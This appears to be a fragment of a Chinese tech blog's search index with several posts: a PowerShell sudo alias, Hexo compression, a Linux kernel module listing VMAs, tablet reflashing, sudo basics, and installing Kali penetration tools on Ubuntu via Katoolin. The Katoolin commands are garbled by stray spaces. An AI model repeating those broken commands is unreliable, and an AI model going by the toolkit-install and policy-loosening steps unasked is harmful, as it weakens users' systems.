更多SpringBoot整合示例https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"},{"name":"springboot","slug":"springboot","permalink":"https://czqu.net/tags/springboot/"},{"name":"java","slug":"java","permalink":"https://czqu.net/tags/java/"},{"name":"spring","slug":"spring","permalink":"https://czqu.net/tags/spring/"}]},{"title":"给你的Powershell做一个“sudo”","slug":"draft/sudo-in-powershell","date":"2020-11-14T09:23:48.000Z","updated":"2020-11-14T09:23:48.000Z","comments":true,"path":"posts/58638/","permalink":"https://czqu.net/posts/58638/","excerpt":"","text":"前言 sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。 开始行动在Windows系统上sudo对应的就是管理员权限了。 一般使用Powershell时，并不会管理员启动，当执行需要权限的命令（比如net start mysql），就需要以管理员打开新的窗口。 为了一步到位，这里给powershell创建一个alias -&gt; sudo 来运行需要管理员权限的命令。 在文档目录中(在powershell执行$profile即可输出此文件路径)，新建文件夹WindowsPowerShell，新建文件Microsoft.PowerShell_profile.ps1。 此文件是在启动Powershell时执行的脚本。set-alias 在退出后就会失效，所以放到启动脚本中。 追加如下代码,然后重启Powershell窗口。 12345function _sudo { $ss = \"$args ; pause\" Start-Process powershell -Verb runAs -ArgumentList $ss}set-alias -name sudo -value _sudo 保存后发现无法加载，因为默认不加载外部脚本，管理员权限下 powershell 运行： 1set-ExecutionPolicy RemoteSigned REMOTESIGNED 脚本可以运行。这是 Windows Server 2012 R2 中的默认执行策略。 要求从 Internet 下载的脚本和配置文件（包括电子邮件和即时消息程序）具有受信任的发布者的数字签名。 不要求你在本地计算机上编写的脚本（不是从 Internet 下载的）具有数字签名。 如果脚本已被取消阻止（比如通过使用 Unblock-File cmdlet），则运行从 Internet 下载但未签名的脚本。 存在运行来自 Internet 之外的源的未签名脚本和已签名但却是恶意的脚本的风险。 完成设置后，输入sudo会打开新的窗口执行命令: 有时候我们又希望直接输入命令打开新窗口,继续追加如下代码，重启powershell 12Function _su {Start-Process -verb runas \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Powershell.exe\"}Set-Alias su _su 输入su命令后会直接弹出一个新的具有管理员权限的powershell 附录cmd 提权：12runas /user:hackett_yu@outlook.com cmddoskey sudo=runas /user:{$username} cmd 快速进入命令行的方法如何从你的文件夹里快速打开命令行？请看下面 1.将鼠标置于指定文件的空白处，按住Shift键的同时右击鼠标，这时在出来的右键菜单里会出现一个”打开命令行” 的菜—单选项，也有可能是“在此处打开Powershell窗口(s)”。这个具体和电脑个体设置有关。 2.直接在指定目录的地址栏中输入cmd,即可进入命令行模式，同理输入powershell也可以 3.安装Windows Terminal ，在应用商店即可下载。（在地址栏输入wt也可以快速调出，但是不会定位到当前目录）","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"}]},{"title":"github+docker+阿里云 自动部署","slug":"draft/后端/docker-github-aliyun-15645","date":"2020-11-14T03:08:16.000Z","updated":"2020-11-14T03:08:16.000Z","comments":true,"path":"posts/35865/","permalink":"https://czqu.net/posts/35865/","excerpt":"","text":"等待更新","categories":[],"tags":[]},{"title":"本站从即日起全面启用全站网页压缩","slug":"draft/enable-Page-compression","date":"2020-11-13T09:01:18.000Z","updated":"2020-11-13T09:01:18.000Z","comments":true,"path":"posts/5772/","permalink":"https://czqu.net/posts/5772/","excerpt":"","text":"为什么要压缩页面静态资源对于个人博客来说，优化页面的访问速度是很有必要的，如果打开你的个人站点，加载个首页就要十几秒，页面长时间处于空白状态，想必没什么人能够忍受得了吧。我个人觉得，如果能把页面的加载时间控制在三四秒内，就很不错了。 那么怎么提高博客的页面加载速度呢？可以从以下的几个方面去入手： 将js文件尽可能放置到body的闭合标签之前，因为在加载或者引入js文件时是阻塞式的，如果我们在页面的最开始就引入这些js文件，而这些文件又比较大，会造成页面在渲染时长时间处于白屏状态。 尽量避免去引用访问速度非常低下的cdn或者图片，可以改用访问速度更快的cdn，或者将难以迅速加载的图片保存到自己的站点目录下，以免在加载图片时耗费了大量的时间，最后还加载不出来。 对页面的静态资源进行压缩，包括css、js和html等文件。我们自己添加的css和js文件为了可读性，往往会有很多换行和空格，这些对于浏览器来说并没什么用，甚至还会降低渲染页面的速度。至于html文件，由于Markdown转成html的bug，会导致页面存在大量的空白，如果你查看下页面的源代码，就会发现这些大量的空白符，十分难看。这也会造成页面渲染的性能问题。 本站主博客由jekyll构成，子博客由hexo构成，目前均已启用静态网页资源的压缩。 hexo的压缩静态资源插件网上有很多相关的博文，常规的做法是使用gulp来进行压缩，gulp是Node.js下的自动构建工具，通过一列的task执行步骤进行自动流程化处理。 使用这种方法会比较麻烦，每次压缩时还需要输入额外的命令，比较繁琐，个人不是很喜欢，有兴趣的可以去自己了解下相关的东西。这篇教程里很多详细的说明，里边有说到gulp的使用，绝对的精品文章。 这里我选择的是由rozbo大佬开发的hexo-neat压缩插件，配置简单，无需额外命令，你只要使用原本的调试三连或者部署三连就可以自动帮你完成静态资源的压缩！ 如何使用hexo-neat在站点根目录下安装hexo-neat1npm install hexo-neat --save1 为站点配置文件添加相关配置下边是我自己站点的相关配置，直接添加到站点配置文件_config.yml的末尾就可以。可以安装自己的需求去自定义配置，不过有些注意事项，可以参考我后文的踩坑记录。 12345678910111213141516171819202122# hexo-neat# 博文压缩neat_enable: true# 压缩htmlneat_html: enable: true exclude:# 压缩css neat_css: enable: true exclude: - '**/*.min.css'# 压缩jsneat_js: enable: true mangle: true output: compress: exclude: - '**/*.min.js' - '**/jquery.fancybox.pack.js' - '**/index.js' 12345678910111213141516171819202122 hexo-neat插件踩坑记录由于在使用hexo-neat插件时，可以在命令窗口中看到各个文件的压缩率，于是我就开始捣鼓跳过哪些文件可以让效率更高。在鼓捣了一段时间之后，记录下使用该插件的一些注意事项，避免日后重蹈覆辙，也希望能对各位看官有所帮助。 跳过压缩文件的正确配置方式如果按照官方插件的文档说明来配置exclude，你会发现完全不起作用。这是因为配置的文件路径不对，压缩时找不到你配置的文件，自然也就无法跳过了。你需要给这些文件指定正确的路径，万能的配置方式如下： 1234neat_css: enable: true exclude: - '**/*.min.css'1234 压缩html时不要跳过.md文件.md文件就是我们写文章时的markdown文件，如果跳过压缩.md文件，而你又刚好在文章中使用到了NexT自带的tab标签，那么当hexo在生成静态页面时就会发生解析错误。这会导致使用到了tab标签的页面生成失败而无法访问。 当初为了找到这个原因花了我两个晚上的时间，简直是夜不能寐。 压缩html时不要跳过.swig文件.swig文件是模板引擎文件，简单的说hexo可以通过这些文件来生成对应的页面。如果跳过这些文件，那么你将会发现，你的所有页面完全没有起到压缩的效果，页面源代码里依然存在着一大堆空白。 参考链接 GitHub项目地址 hexo博客压缩优化 Hexo-Neat介绍 jekyll的压缩稍后更新","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"},{"name":"前端","slug":"前端","permalink":"https://czqu.net/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"Linux内核模块编程小例子之查看虚拟内存VMA(virtual memory areas）信息","slug":"draft/操作系统/Linux-VMA","date":"2020-11-13T07:49:03.000Z","updated":"2020-11-13T07:49:03.000Z","comments":true,"path":"posts/33535/","permalink":"https://czqu.net/posts/33535/","excerpt":"","text":"前言： 在 32 位的系统上，线性地址空间为 4GB，其中用户进程占有 3GB 线性地址空间，内核占有 1GB 线性地址空间。由于虚拟内存的引入，使的每个进程都可拥有 3GB 的虚拟内存。 用户进程的虚拟地址空间包含若干区域，这些区域的分布方式因体系结构的差异而不同，但所有的方式都包含下列成分： （1） 代码段：可执行文件的二进制代码 （2） 数据段：存储全局变量 （3） 栈：用于保存局部变量和实现函数调用 （4） 环境变量和命令行参数 （5） 程序使用的动态库的代码 （6） 用于映射文件内容的区域为便于描述，系统中进程的虚拟内存空间被划分为若干不同的区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在 Linux 内核中，这样的区域被称为虚拟内存区域(virtual memory areas，VMA)。一个 VMA 是一块连续的线性地址空间的抽象，它拥有自身的权限(可读，可写，可执行等) ，对进程而言，VMA 其实是虚拟空间的内存块，一个进程的所有资源由多个内存块组成。 每一个虚拟内存区域都由一个相关的 struct vm_area_struct 结构来描述。 本文将编写一个内核模块，通过此内核模块遍历一个用户进程中所有的 VMA，并且打印这些 VMA 的属性信息，如 VMA 的大小、起始地址等，并通过与“/proc/pid/maps”中显示的信息进行对比验证 VMA 信息是否正确。 本文所使用的环境： 操作系统：4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux gcc: 7.5.0 make:GNU Make 4.1 编写模块程序参考代码如下，代码文件命名为“vma_test.c” 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//vma_test.c#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/mm.h&gt;#include &lt;linux/sched.h&gt;static int pid;module_param(pid, int, 0644);static void printit(struct task_struct *tsk){ struct mm_struct *mm; struct vm_area_struct *vma; int j = 0; unsigned long start, end, length; mm = tsk-&gt;mm; pr_info(\"mm_struct addr = 0x%p\\n\", mm); vma = mm-&gt;mmap; /* 使用 mmap_sem 读写信号量进行保护 */ down_read(&amp;mm-&gt;mmap_sem); pr_info(\"vmas: vma start end length\\n\"); while (vma) { j++; start = vma-&gt;vm_start; end = vma-&gt;vm_end; length = end - start; pr_info(\"%6d: %16p %12lx %12lx %8ld\\n\", j, vma, start, end, length); vma = vma-&gt;vm_next; } up_read(&amp;mm-&gt;mmap_sem);}static int __init vma_init(void){ struct task_struct *tsk; /* 如果插入模块时未定义 pid 号，则使用当前 pid */ if (pid == 0) { tsk = current; pid = current-&gt;pid; pr_info(\"using current process\\n\"); } else { tsk = pid_task(find_vpid(pid), PIDTYPE_PID); } if (!tsk) return -1; pr_info(\" Examining vma's for pid=%d, command=%s\\n\", pid, tsk-&gt;comm); printit(tsk); return 0;}static void __exit vma_exit(void){ pr_info(\"Module exit\\n\");}module_init(vma_init);module_exit(vma_exit);MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"Mr Yu\");MODULE_DESCRIPTION(\"vma test\"); 以上代码中: 38-52 行是内核模块初始化函数 vma_init； 40-46 行目的是获取 pid，可在加载模块时可传递相关参数（即进程 pid）；如果没有传递参数，则使用当前进程，即执行 insmod 命令的进程； 45 行 pid_task()函数为获取任务的任务描述符信息，其返回值是 struct task_struct 结构体类型的变量； 50 行调用自定义的 printit()函数打印相关信息； 9-34 行是本实验核心函数； 16 行获取待检查进程的内存描述符 struct mm_struct 数据结构，该结构由struct task_struct 中的*mm 指向； 18 行获取 VMA 链表头，即 mm-&gt;mmap； 21 行开始遍历 VMA 链表,down_read()函数用于申请读信号量，因本程序只是读取 VMA 链表，所以申请读者类型即可，若需丢 VMA 链表进行修改，则需申请写者类型信号量； 24-32 行遍历 VMA 链表，并对每个 VMA 打印其起始地址、终止地址和长度信息； 33 行释放读者信号量。 编译内核模块编写 Makefile 文件，文件名必须为“Makefile” 12345678910obj-m := vma_test.oKERNELBUILD := /lib/modules/$(shell uname -r)/buildCURRENT_PATH := $(shell pwd)all: make -C $(KERNELBUILD) M=$(CURRENT_PATH) modulesclean: make -C $(KERNELBUILD) M=$(CURRENT_PATH) clean 编译 使用 make 命令编译即可。 插入模块 先通过 top 命令查看进程，任意获取一个进程 pid，如图所示， 本例中获取apache2 进程的 pid 3509。 使 用 insmod 插 入 模 块 ， 并 传 参 。 如 图 所 示 ， 本 例 中 模 块 名 为“vma_test.ko”,pid 为 3509，则插入模块命令为： 1insmod vma_test.ko pid=3509 查看程序打印信息通过 dmesg 命令查看 VMA 信息。如下图所示: 从上图可看到 apache2 进程包含许多 VMA 区域，以第一个 VMA 区域为例，其起始地址为 0x564af2e3a000,结束地址为 564af2ed7000,长度为 643072 字节。 如下图所示为从 proc 虚拟文件系统中查看相应进程第一个 VMA 的完整信息。 从以上两图中内容对比可知，本程序输出信息正确。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"}]},{"title":"联想 Lenovo Tab3 10 Business TB3-X70F （国际版）线刷","slug":"draft/Lenovo-Tab3-10","date":"2020-11-13T07:45:55.000Z","updated":"2020-11-13T07:45:55.000Z","comments":true,"path":"posts/13741/","permalink":"https://czqu.net/posts/13741/","excerpt":"","text":"本文介绍将联想 Lenovo Tab3 10 Business TB3-X70F 刷成国际版的方法，或者可用此方法破解学习平板定制机 中文1.下载工具包链接：https://pan.baidu.com/s/155ta-glHLtbTmAGWHo1HrQ提取码：rfy4 2.安装驱动https://www.androidfilehost.com/?fid=245910004249436633.解压MediaTek SP Flash Tool和线刷包4.管理员运行MediaTek SP Flash Tool5.选择Download Only6.线刷包里的scatter file，然后点Download7.平板关机8.按住音量加键的同时插入usb到电脑9.当进度条变红开始刷机，当显示ok的时候刷机结束，重启即可。 English1.Install MediaTek Preloader USB VCOM driver https://www.androidfilehost.com/?fid=24591000424943663 Most importantly the Preloader USB VCOM driver that is essential for gettingthe SmartPhone Flash Tool (SPFT) to work. Contents: Android\\android_winusb.infInstalls ADB (Android Debug Bridge, “USB-Debugging”) driver forMediaTek’s vendor ID (VID_0E8D).Optional. Your Android device might use a different vender ID anyway,so you should first try the vendor’s ADB driver, if available. CDC\\cdc-acm.infInstalls VCOM (virtual serial port) driver.Required for the SPFT! tetherxp.inf“RNDIS-over-USB host driver for Intenet Sharing”.You probably don’t need this. wpdmtp.infMedia Transfer Protocol (MTP) driver for MediaTek’s vendor ID.You probably don’t need this on modern operating systems. To install any of these INF files, first extract this ZIP archive. Then, for Windows 8 and 10:Simply right-click any extracted INF file,and select “Install” in the appearing context menu. For Windows 7: Open the Windows Device Manager In the “Action” menu, click “Add legacy hardware” Click Next Select “Install the hardware that I manually select from a list (Advanced)” Click Next In the list, select “Ports (COM &amp; LPT)” Click Next Click “Have Disk…” Browse for the INF file, e.g. cdc-acm.inf Select the driver you want to install, e.g. “MediaTek PreLoader USB VCOM (Android)” If a new device appears in the Device Manager with a yellow warning triangleand error code 10, just select it and delete it (delete key). But do NOT deletethe driver software. 2.Install MediaTek SP Flash Tool (SPFT)3.Extract firmware archive4.Start SPFT5.Make sure “Download Only” mode is selected6.Load scatter file from extracted firmware6.SPFT should auto-load firmware and verify checksum7.Optional: select DA_SWSEC.bin as Download Agent8.Optional: remove checkbox from partitions you do not want to flash9.Click the Download button in SPFT10.Turn off tablet completely11.Hold volume-UP key on tablet while connecting it to PC via USB12.After a few seconds, SPFT should find tablet and start13.Release volume-UP key and wait for flashing to finish Note: when you load a scatter file, there MUST be a valid preloaderin the same directory as the scatter file, or else an error willoccur when you start a download/flash. You can clear the checkbox ofthe preloader, so that it won’t be flashed, but its “Location” fieldmust be filled.","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"},{"name":"刷机","slug":"刷机","permalink":"https://czqu.net/tags/%E5%88%B7%E6%9C%BA/"}]},{"title":"Linux 所有命令无法使用的解决方法","slug":"draft/Linux-commands-unavailable","date":"2020-11-13T07:39:52.000Z","updated":"2020-11-13T07:39:52.000Z","comments":true,"path":"posts/36827/","permalink":"https://czqu.net/posts/36827/","excerpt":"","text":"这是由于环境变量设置出错导致的 解决方法： 直接在命令行中输入以下代码，然后回车 1export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 然后输入如下代码， 把错误的环境变量修正： 1sudo vim /etc/profile","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"}]},{"title":"详解管理root用户权限的sudo服务程序","slug":"draft/Selectively-deploying-your-superpowers-on-Linux","date":"2020-11-13T07:24:49.000Z","updated":"2020-11-13T07:24:49.000Z","comments":true,"path":"posts/48730/","permalink":"https://czqu.net/posts/48730/","excerpt":"","text":"sudo 命令允许特权用户以 root 用户身份运行全部或部分命令，但是理解其能做什么和不能做什么很有帮助。 在你想要使用超级权限临时运行一条命令时，sudo 命令非常方便，但是当它不能如你期望的工作时，你也会遇到一些麻烦。比如说你想在某些日志文件结尾添加一些重要的信息，你可能会尝试这样做： 12$ echo \"Important note\" &gt;&gt; /var/log/somelog-bash: /var/log/somelog: Permission denied 好吧，看起来你似乎需要一些额外的特权。一般来说，你不能使用你的用户账号向系统日志中写入东西。我们使用 sudo 再尝试一次吧。 123$ sudo !!sudo echo \"Important note\" &gt;&gt; /var/log/somelog-bash: /var/log/somelog: Permission denied 嗯，它还是没有啥反应。我们来试点不同的吧。 12$ sudo 'echo \"Important note\" &gt;&gt; /var/log/somelog'sudo: echo \"Important note\" &gt;&gt; /var/log/somelog: command not found 也可以查看：在 Linux 下排查故障的宝贵提示和技巧。 接下来该干什么？上面在执行完第一条命令后的回应显示，我们缺少向日志文件写入时必须的特权。第二次，我们使用 root 权限运行了第一次的命令，但是返回了一个“没有权限”的错误。第三次，我们把整个命令放在一个引号里面再运行了一遍，返回了一个“没有发现命令”的错误。所以，到底错在哪里了呢？ 第一条命令：没有 root 特权，你无法向这个日志中写入东西。 第二条命令：你的超级权限没有延伸到重定向。 第三条命令：sudo 不理解你用引号括起来的整个 “命令”。 而且如果你的用户还未添加到 sudo 用户组的时候，如果尝试使用 sudo，你可能已经看到过像下面的这么一条错误了： 1nemo is not in the sudoers file. This incident will be reported. 你可以做什么？一个相当简单的选择就是使用 sudo 命令暂时成为 root。鉴于你已经有了 sudo 特权，你可以使用下面的命令执行此操作： 123$ sudo su[sudo] password for nemo:# 注意这个改变的提示符表明了你的新身份。然后你就可以以 root 运行之前的命令了： 1# echo \"Important note\" &gt;&gt; /var/log/somelog 接着你可以输入 ^d 返回你之前的身份。当然了，一些 sudo 的配置可能会阻止你使用 sudo 命令成为 root。 另一个切换用户为 root 的方法是仅用 su 命令，但是这需要你知道 root 密码。许多人被赋予了访问 sudo 的权限，而并不知道 root 密码，所以这并不是总是可行。 （采用 su 直接）切换到 root 之后，你就可以以 root 的身份运行任何你想执行的命令了。这种方式的问题是：1) 每个想要使用 root 特权的人都需要事先知道 root 的密码（这样不很安全）；2) 如果在运行需要 root 权限的特定命令后未能退出特权状态，你的系统可能会受到一些重大错误的波及。sudo 命令旨在允许您仅在真正需要时使用 root 权限，并控制每个 sudo 用户应具有的 root 权限。它也可以使你在使用完 root 特权之后轻松地回到普通用户的状态。 另外请注意，整个讨论的前提是你可以正常地访问 sudo，并且你的访问权限没有受限。详细的内容后面会介绍到。 还有一个选择就是使用一个不同的命令。如果通过编辑文件从而在其后添加内容是一种选择的话，你也许可以使用 sudo vi /var/log/somelog，虽然编辑一个活跃的日志文件通常不是一个好主意，因为系统可能会频繁的向这个文件中进行写入操作。 最后一个但是有点复杂的选择是，使用下列命令之一可以解决我们之前看到的问题，但是它们涉及到了很多复杂的语法。第一个命令允许你在得到 “没有权限” 的拒绝之后可以使用 !! 重复你的命令： 12345$ sudo echo \"Important note\" &gt;&gt; /var/log/somelog-bash: /var/log/somelog: Permission denied$ !!:gs/&gt;/|sudo tee -a / &lt;=====$ tail -1 /var/log/somelogImportant note 第二种是通过 sudo 命令，把你想要添加的信息传递给 tee。注意，-a 指定了你要附加文本到目标文件： 123$ echo \"Important note\" | sudo tee -a /var/log/somelog$ tail -1 /var/log/somelogImportant note sudo 有多可控？回答这个问题最快速的回答就是，它取决于管理它的人。大多数 Linux 的默认设置都非常简单。如果一个用户被安排到了一个特别的组中，例如 wheel 或者 admin 组，那这个用户无需知道 root 的密码就可以拥有运行任何命令的能力。这就是大多数 Linux 系统中的默认设置。一旦在 /etc/group 中添加了一个用户到了特权组中，这个用户就可以以 root 的权力运行任何命令。另一方面，可以配置 sudo，以便一些用户只能够以 root 身份运行单一指令或者一组命令中的任何一个。 如果把像下面展示的这些行添加到了 /etc/sudoers 文件中，例如 “nemo” 这个用户可以以 root 身份运行 whoami 命令。在现实中，这可能不会造成任何影响，它非常适合作为一个例子。 123# User alias specificationnemo ALL=(root) NOPASSWD: WHOAMI# Cmnd alias specificationCmnd_Alias WHOAMI = /usr/bin/whoami 注意，我们添加了一个命令别名（Cmnd_Alias），它指定了一个可以运行的命令的全路径，以及一个用户别名，允许这个用户无需密码就可以使用 sudo 执行的单个命令。 当 nemo 运行 sudo whoami 命令的时候，他将会看到这个： 12$ sudo whoamiroot 注意这个，因为 nemo 使用 sudo 执行了这条命令，whoami 会显示该命令运行时的用户是 root。 至于其他的命令，nemo 将会看到像这样的一些内容： 123$ sudo date[sudo] password for nemo:Sorry, user nemo is not allowed to execute '/bin/date' as root on butterfly. sudo 的默认设置在默认路径中，我们会利用像下面展示的 /etc/sudoers 文件中的几行： 12345$ sudo egrep \"admin|sudo\" /etc/sudoers# Members of the admin group may gain root privileges%admin ALL=(ALL) ALL &lt;=====# Allow members of group sudo to execute any command%sudo ALL=(ALL:ALL) ALL &lt;===== 在这几行中，%admin 和 %sudo 都说明了任何添加到这些组中的人都可以使用 sudo 命令以 root 的身份运行任何命令。 下面列出的是 /etc/group 中的一行，它意味着每一个在该组中列出的成员，都拥有了 sudo 特权，而无需在 /etc/sudoers 中进行任何修改。 1sudo:x:27:shs,nemo 总结sudo 命令意味着你可以根据需要轻松地部署超级用户的访问权限，而且只有在需要的时候才能赋予用户非常有限的特权访问权限。你可能会遇到一些与简单的 sudo command 不同的问题，不过在 sudo 的回应中应该会显示你遇到了什么问题。 来自https://linux.cn/article-10310-1.html via: https://www.networkworld.com/article/3322504/linux/selectively-deploying-your-superpowers-on-linux.html","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"}]},{"title":"在Ubuntu中使用Katoolin安装Kali Linux Tools","slug":"draft/Ubuntu-install-Kali-Linux-Tools","date":"2020-11-13T07:08:19.000Z","updated":"2020-11-13T07:08:19.000Z","comments":true,"path":"posts/50854/","permalink":"https://czqu.net/posts/50854/","excerpt":"","text":"本文将引导您逐步在Ubuntu中使用Katoolin安装Kali Linux Tools。对于那些不知道的人，Katoolin是一个Python脚本，可用于一次安装所有Kali Linux工具或手动一次安装。Kali Linux具有300多种渗透测试工具。除了安装所有工具，您还可以使用Katoolin在Linux框中仅安装您选择的选择性工具。如果您想在Ubuntu或任何其他基于DEB的系统上尝试使用Kali Linux工具，则应该尝试一下Katoolin。它将在您的Ubuntu系统中添加Kali Linux存储库，以便您可以一次安装所有渗透测试工具，也可以仅安装必要的工具。Katoolin是完全免费的开源软件，并已在基于Debian的系统上经过正式测试。 在Ubuntu 18.04 LTS中安装Katoolin我已经在Ubuntu 18.04 LTS服务器版本中测试了Katoolin。但是，它应该可以在其他Ubuntu版本和派生版本上使用。 确保在Ubuntu系统中安装了以下先决条件。 Python 2.7 Git 这些软件包在Ubuntu的默认源中可用，因此您可以使用apt软件包管理器进行安装。 1$ sudo apt-get install python git 另外，请确保已启用**[Universe]**源。 1$ sudo add-apt-repository Universe 这是我的测试机详细信息： 1234567891011cuiqingwei@Gary-Aspire-4739:/usr/bin$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 18.04.3 LTSRelease: 18.04Codename: bioniccuiqingwei@Gary-Aspire-4739:/usr/bin$ python -VPython 2.7.15+cuiqingwei@Gary-Aspire-4739:/usr/bin$ git --versiongit version 2.17.1cuiqingwei@Gary-Aspire-4739:/usr/bin$ python和git版本 好吧，我们已经准备就绪。安装必备组件后，如下所示安装Katoolin： 1$ git clone https://github.com/LionSec/katoolin.git 上面的命令会将katoolin存储库克隆到当前工作目录中名为“ katoolin”的文件夹中。 接下来，将Katoolin二进制文件复制到您的路径，例如**/ usr / bin /**，如下所示。 1$ sudo cp katoolin / katoolin.py / usr / bin / katoolin 最后，将Katoolin二进制文件设置为可执行文件： 1$ sudo chmod + x / usr / bin / katoolin 现在，我们已经安装了Katoolin。让我们继续前进，看看如何使用它。 使用Katoolin安装Kali Linux Tools所有命令都应以root用户或sudo特权运行。 要启动Katoolin，请运行以下命令： 1$ sudo katoolin 这就是katoolin命令行界面的样子。 123456789101112131415161718192021222324 $$\\ $$\\ $$\\ $$\\ $$\\ $$ | $$ | $$ | $$ |\\__| $$ |$$ / $$$$$$\\ $$$$$$\\ $$$$$$\\ $$$$$$\\ $$ |$$\\ $$$$$$$\\ $$$$$ / \\____$$\\ \\_$$ _| $$ __$$\\ $$ __$$\\ $$ |$$ |$$ __$$\\ $$ $$&lt; $$$$$$$ | Kali linux tools installer |$$ |$$ |$$ | $$ | $$ |\\$$\\ $$ __$$ | $$ |$$\\ $$ | $$ |$$ | $$ |$$ |$$ |$$ | $$ | $$ | \\$$\\ \\$$$$$$$ | \\$$$$ |\\$$$$$$ |\\$$$$$$ |$$ |$$ |$$ | $$ | \\__| \\__| \\_______| \\____/ \\______/ \\______/ \\__|\\__|\\__| \\__| V2.0 + -- -- +=[ Author: LionSec | Homepage: www.neodrix.com + -- -- +=[ 331 Tools [W] Before updating your system , please remove all Kali-linux repositories to avoid any kind of problem . 1) Add Kali repositories &amp; Update 2) View Categories3) Install classicmenu indicator4) Install Kali menu5) Helpkat &gt; 启动Katoolin 如上所示，Katoolin主界面有四个选项。输入数字以打开相应的子菜单。让我们一一看。 1.添加Kali存储库并更新该选项使您可以将kali Linux存储库添加到Linux系统。为此，请键入 1（数字1）以添加存储库。 123456781) Add Kali repositories &amp; Update 2) View Categories3) Install classicmenu indicator4) Install Kali menu5) Help kat &gt; 1 添加Kali存储库 将打开一个子菜单。再次输入1以添加Kali-linux存储库。 123456789kat &gt; 11) Add kali linux repositories2) Update3) Remove all kali linux repositories4) View the contents of sources.list file What do you want to do ?&gt; 1 然后，键入2以更新存储库： 1234567891011Executing: /tmp/apt-key-gpghome.MvaSscaYwv/gpg.1.sh --keyserver pool.sks-keyservers.net --recv-keys ED444FF07D8D0BF6gpg: connecting dirmngr at '/tmp/apt-key-gpghome.MvaSscaYwv/S.dirmngr' failed: IPC connect call failedgpg: keyserver receive failed: No dirmngr1) Add kali linux repositories2) Update3) Remove all kali linux repositories4) View the contents of sources.list file What do you want to do ?&gt; 2 类型3，如果你想删除已添加的卡利Linux的存储库，并键入4，查看的sources.list文件的内容。 要返回上一菜单，请键入back，然后按Enter。 12345678What do you want to do ?&gt; back1) Add Kali repositories &amp; Update 2) View Categories3) Install classicmenu indicator4) Install Kali menu5) Helpkat &gt; 要返回主菜单，请键入gohome，然后按Enter。 12345678kat &gt; gohome1) Add Kali repositories &amp; Update 2) View Categories3) Install classicmenu indicator4) Install Kali menu5) Helpkat &gt; 2.类别要查看所有可用类别列表，请在主菜单中键入2。 1234567891011kat &gt; 2**************************** All Categories *****************************1) Information Gathering 8) Exploitation Tools2) Vulnerability Analysis 9) Forensics Tools3) Wireless Attacks 10) Stress Testing4) Web Applications 11) Password Attacks5) Sniffing &amp; Spoofing 12) Reverse Engineering6) Maintaining Access 13) Hardware Hacking7) Reporting Tools 14) Extra0) AllSelect a category or press (0) to install all Kali linux tools . 如您在上面的输出中看到的，有14个类别可用。您可以一次安装所有它们，也可以通过输入相应的类别编号来安装任何特定类别。 要安装所有kali Linux工具，请键入0（零），然后按Enter键。这将安装所有工具。需要一段时间，具体取决于Internet的速度。另外，请确保硬盘驱动器中有足够的可用空间。安装所有Kali Linux可能会占用大量磁盘空间。 如果您不具备所有工具，则只需安装要使用的工具即可。举例来说，要在“ 漏洞利用工具”类别下安装工具，请键入8并按Enter。它将显示一个子菜单，并列出此类别中的所有可用软件包。您可以通过键入0（零）来安装该类别中的所有工具，或者键入任何特定的数字以将特定工具安装在“利用工具”类别下。 123456789101112131415161718192021222324252627kat &gt; 8=+[ Exploitation Tools1) Armitage 2) Backdoor Factory 3) BeEF 4) cisco-auditing-tool 5) cisco-global-exploiter 6) cisco-ocs 7) cisco-torch 8) commix 9) crackle10) jboss-autopwn11) Linux Exploit Suggester12) Maltego Teeth13) SET14) ShellNoob15) sqlmap16) THC-IPV617) Yersinia0) Install all Exploitation ToolsInsert the number of the tool to install it .kat &gt; 要返回上一级菜单，请键入back，然后要返回主菜单，请键入gohome。 3.安装ClassicMenu指示器ClassicMenu Indicator是Ubuntu桌面环境顶部面板的通知区域小程序。它为那些喜欢Unity破折号菜单的人提供了一种获取经典GNOME风格应用程序菜单的简单方法。像经典的GNOME菜单一样，它包含Wine游戏和应用程序（如果已安装）。 要安装它，请键入3并按Enter，然后键入y进行确认并安装。 4.安装Kali菜单要安装Kali Menu，请键入4， 然后键入 y 以确认安装。 使用Katoolin完成操作后，按 “ Ctrl + C”退出。 1kat &gt; ^CShutdown requested...Goodbye... 就这样。如您所见，Katoolin是非常简单易用的工具，它提供了一种在Ubuntu Linux盒子中安装Kali Linux工具的简便方法。您并不总是需要Kali Linux来尝试所有取证，渗透和安全测试工具。Katoolin将在任何基于DEB的Linux系统中轻松为您完成此任务。试试看，您不会失望的。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"静态编译opencv库","slug":"draft/Statically-compile-opencv-library","date":"2020-11-13T05:13:58.000Z","updated":"2020-11-13T05:13:58.000Z","comments":true,"path":"posts/19264/","permalink":"https://czqu.net/posts/19264/","excerpt":"","text":"一、准备： 1.cmake 2.opencv源码 